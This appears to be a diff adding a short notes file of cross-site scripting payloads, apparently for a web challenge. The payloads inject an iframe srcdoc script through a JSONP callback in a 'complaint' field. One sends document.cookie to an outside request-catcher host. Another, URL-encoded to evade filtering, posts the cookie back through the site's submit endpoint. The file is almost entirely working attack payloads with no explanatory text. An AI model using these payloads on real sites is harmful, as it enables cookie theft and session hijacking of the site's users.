@@ -1,0 +1,13 @@
+working injection
+{"complaint":"<iframe srcdoc=\"<script src=&quot;/api/jsonp?callback=alert&quot;></script>\"></iframe>"}
+
+working but blocked
+{"complaint":"<iframe srcdoc=\"<script src=&quot;/api/jsonp?callback=document.location='http://coyote.requestcatcher.com/c/'%2bdocument.cookie;console.log&quot;></script>\"></iframe>"}
+
+
+
+xhttp=new XMLHttpRequest();xhttp.open("POST", "/api/submit", false);xhttp.setRequestHeader("Content-type", "application/json");xhttp.send(JSON.stringify({complaint: document.cookie}));
+
+
+{"complaint":"<iframe srcdoc=\"<script src=&quot;/api/jsonp?callback=%78%68%74%74%70%3d%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%78%68%74%74%70%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%61%70%69%2f%73%75%62%6d%69%74%22%2c%20%66%61%6c%73%65%29%3b%78%68%74%74%70%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%74%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%22%29%3b%78%68%74%74%70%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%7b%63%6f%6d%70%6c%61%69%6e%74%3a%20%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%7d%29%29%3balert&quot;></script>\"></iframe>"}
+
